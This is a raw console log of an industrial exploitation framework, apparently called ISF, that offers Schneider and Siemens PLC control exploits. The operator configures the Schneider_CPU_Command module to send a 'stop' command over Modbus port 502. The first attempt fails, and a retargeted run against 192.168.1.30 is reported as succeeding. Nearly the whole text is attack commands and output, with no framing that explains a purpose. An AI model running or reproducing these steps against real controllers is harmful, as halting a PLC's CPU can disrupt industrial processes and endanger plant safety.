isf > autorun
[*] Autorun ON

Exploit Autorun List
====================

  0) apply
  1) touch all
  2) prompt confirm
  3) execute


Payload Autorun List
====================

  0) apply
  1) prompt confirm
  2) execute


isf > setg ISFStorage D:\isf\isf\storage
[+] Set ISFStorage =>. D:\isf\isf\storage
isf > 
isf > 
isf > 
isf > !print 192.168.1.30
isf > !pring 192.168.1.30
isf > !ping 192.168.1.30
isf > show

Plugin Categories
=================

  Category     Active Plugin
  --------     -------------
  Exploit      None
  Payload      None

isf > show Exploit

Plugin Category: Exploit
========================

  Name                            Version
  ----                            -------
  Schneider_CPU_Command           1.1.0
  Siemens_300_400_CPU_Control     1.1.0

isf > use Schneider_CPU_Command

[!] Entering Plugin Context :: Schneider_CPU_Command
[*] Applying Global Variables

isf Exploit (Schneider_CPU_Command) > apply
[*] Applying Session Parameters
isf Exploit (Schneider_CPU_Command) > echo Running Exploit Touches
[*] Running Exploit Touches
isf Exploit (Schneider_CPU_Command) > touch all
isf Exploit (Schneider_CPU_Command) > enter Exploit

isf Exploit (Schneider_CPU_Command) > prompt confirm

[!] Enter Prompt Mode :: Schneider_CPU_Command

Module: Schneider_CPU_Command
=============================

  Name            Value                                                 
  ----            -----                                                 
  TargetIp                                                              
  TargetPort      502                                                   
  Command         stop                                                  

[!] plugin variables are valid

[*]  TargetIp :: Target IP Address

[+] Set TargetIp => 127.0.0.1

[*]  TargetPort :: Target Port

[+] Set TargetPort => 502

[*]  Command :: The control command of cpu [stop/start]

[+] Set Command => stop

isf Exploit (Schneider_CPU_Command) > execute

[!] Preparing to Execute Schneider_CPU_Command

Module: Schneider_CPU_Command
=============================

  Name            Value                                                 
  ----            -----                                                 
  TargetIp        127.0.0.1                                             
  TargetPort      502                                                   
  Command         stop                                                  

[*] Executing Plugin
[!] Plugin failed
[-] Error: Schneider_CPU_Command Failed
isf Exploit (Schneider_CPU_Command) > set TargetIp 192.168.1.31
[+] Set TargetIp => 192.168.1.31
isf Exploit (Schneider_CPU_Command) > !ping 192.168.1.31
[!] Execution aborted by user: Ctrl-c
isf Exploit (Schneider_CPU_Command) > !ping 192.168.1.30
[!] Execution aborted by user: Ctrl-c
isf Exploit (Schneider_CPU_Command) > set TargetIp 192.168.1.30
[+] Set TargetIp => 192.168.1.30
isf Exploit (Schneider_CPU_Command) > history

   0  echo Initializing isf v1.1.1
   1  echo Adding Global Variables
   2  setg ResourcesDir c:\isf\Resources
   3  setg Color True
   4  setg ShowHiddenParameters False
   5  setg NetworkTimeout 60
   6  setg LogDir D:\isf\isf\logs
   7  autorun
   8  setg ISFStorage D:\isf\isf\storage
   9  !print 192.168.1.30
  10  !pring 192.168.1.30
  11  !ping 192.168.1.30
  12  show
  13  show Exploit
  14  use Schneider_CPU_Command
  15  apply
  16  echo Running Exploit Touches
  17  touch all
  18  enter Exploit
  19  prompt confirm
  20  execute
  21  set TargetIp 192.168.1.31
  22  !ping 192.168.1.31
  23  !ping 192.168.1.30
  24  set TargetIp 192.168.1.30

isf Exploit (Schneider_CPU_Command) > execute

[!] Preparing to Execute Schneider_CPU_Command

Module: Schneider_CPU_Command
=============================

  Name            Value                                                 
  ----            -----                                                 
  TargetIp        192.168.1.30                                          
  TargetPort      502                                                   
  Command         stop                                                  

[*] Executing Plugin
[+] Schneider_CPU_Command Succeeded

isf Exploit (Schneider_CPU_Command) > EOF
